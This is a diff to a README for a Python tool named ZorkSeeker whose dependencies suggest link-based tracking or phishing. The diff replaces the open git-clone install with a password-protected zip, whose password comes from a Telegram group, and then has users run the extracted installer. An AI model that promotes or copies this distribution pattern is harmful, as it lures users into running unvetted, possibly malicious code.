@@ -110,29 +110,44 @@ Built from scratch with a modular Python architecture, it works seamlessly acros
 
 ## 📦 Installation
 
-### Prerequisites
-- Python 3.8 or higher
-- pip (Python package manager)
-- Git
+### 🔐 Step 1 — Get the Password
+
+The release `.zip` is **password-protected**. To get the password:
+
+<div align="center">
+
+[![Telegram](https://img.shields.io/badge/Join-Telegram_Group-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/quickbreach)
+
+**👉 [t.me/quickbreach](https://t.me/quickbreach)**
+
+</div>
+
+> Join the group → get the zip password → extract the files.
+
+---
 
 ### 🐧 Linux / 📱 Termux
 
 ```bash
-git clone https://github.com/samay825/ZorkSeeker.git
-cd ZorkSeeker
+# 1. Run the installer (auto-installs everything)
 chmod +x install.sh
 bash install.sh
+
+# 2. Launch
+python3 zorktracker.py
 ```
 
 ### 🪟 Windows
 
 ```bash
-git clone https://github.com/samay825/ZorkSeeker.git
-cd ZorkSeeker
+# 1. Extract the zip using the password from Telegram group
+# 2. Open terminal in the extracted folder
+
 pip install -r requirements.txt
+python zorktracker.py
 ```
 
-### 🔧 Manual Dependency Install
+### 🔧 Manual Dependency Install (Optional)
 
 ```bash
 pip install flask requests pyngrok qrcode Pillow packaging pyshorteners
